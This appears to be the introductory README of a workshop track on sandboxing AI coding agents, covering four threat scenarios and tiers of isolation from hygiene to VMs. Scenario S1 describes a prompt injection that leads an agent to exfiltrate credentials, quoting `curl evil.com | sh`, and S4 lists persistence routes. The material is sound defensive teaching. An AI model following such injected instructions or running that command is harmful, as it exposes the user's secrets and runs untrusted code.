# Sandboxing AI coding agents

Topics in this track address one question: *when you let an AI coding agent run on your machine, what should and shouldn't it be able to reach?*

If you saw the talk, this is a refresher. If you didn't, what follows is enough context to start any topic in this track.

## What we're protecting against

Four scenarios recur across the topics. We refer to them as **S1** through **S4** so they're easy to point at later.

- **S1 — Credential exfiltration via poisoned context.** Your agent reads something it doesn't fully trust (a file, a webpage, a tool response, an issue comment) and the content quietly tells it to send your `~/.aws/credentials` somewhere. The threat isn't "the model says something bad" — it's "the model runs `curl evil.com | sh` because a README told it to."
- **S2 — Supply chain via add-ons.** A plugin, MCP server, browser extension, or other add-on you connected your agent to is malicious or has been compromised, and now it can do whatever the agent could do.
- **S3 — Scope creep on benign tasks.** You ask your agent to do something innocuous, and it pokes around in places it shouldn't — reads `~/Documents/taxes/` while "summarizing your project," or scans every file in `~`.
- **S4 — Persistence and lateral movement.** Your agent (or something it ran) writes itself somewhere that survives the session: a shell rc file, a cron job, a launch agent, a git hook. Next session, it's still there.

These are the threat shapes. Each topic in this track addresses a slice of them; no single technique addresses all four.

## How sandboxing techniques are organized

Sandbox mechanisms compose from cheap-and-leaky to expensive-and-strict. We talk about them in tiers:

- **Tier 0 — Hygiene.** Not a sandbox. Things like keeping secrets out of your shell, scoping credentials to least privilege, and human-in-the-loop gates before destructive actions. Cheap, fast, real value, but doesn't stop malicious code from doing what it has access to.
- **Tier 1 — Process-level isolation.** Same machine, same user, but with restrictions on what the process can read, write, or which syscalls it can make. Linux: bubblewrap, firejail, Landlock, seccomp-bpf. Mac: `sandbox-exec`, App Sandbox entitlements. Windows: AppContainer, Job Objects.
- **Tier 2 — Containers.** Separate filesystem and process namespace, shared kernel. Docker, Podman, devcontainers, gVisor (which sits between containers and VMs by intercepting syscalls in user space).
- **Tier 3 — Virtualization.** Separate kernel. Firecracker microVMs, qemu/kvm, Hyper-V, Apple's Virtualization framework, Windows Sandbox.
- **Tier 4 — Physical or account isolation.** Different user account, different machine, different cloud account. The "unfashionable but works" tier.

People compose these in practice. Tier 0 hygiene shows up regardless of which other tier you're using; very few real setups are single-tier.

## Picking a tier for a task

Two questions, in order:

1. **How much do you trust this code/agent/context right now?** (Trusted, semi-trusted, untrusted.)
2. **What can the process reach if it misbehaves?** (Nothing valuable, dev credentials, prod credentials, customer data, the whole machine.)

Pick the lowest tier where the worst plausible outcome is acceptable. That's the framework. Each topic walks one specific threat-and-tier combination so you build the muscle for picking yourself.

## What this track isn't

- A flowchart that tells you which sandbox to use. Reductive, will be wrong for someone in the room.
- A performance comparison. Mac and Windows containers run on a Linux VM substrate, so any cross-platform benchmark mostly measures hypervisor overhead, not the sandbox itself. We compare on security properties instead.
- An ad for any specific tool. Examples are written fresh; the underlying ideas are what travel.

## Topics

| Topic | Tier(s) | Threat focus | Format |
|-------|---------|--------------|--------|
| [`cred-scrub/`](cred-scrub/) | 0 | S1 (accidental exposure form) | Workshop |
| [`direnv-perimeter/`](direnv-perimeter/) | 0 | S1, S3 | Workshop (builds on cred-scrub) |
| [`container-isolation/`](container-isolation/) | 2 | S1, S2, S3 | Workshop (composes with Tier 0) |

More topics will appear here over time.
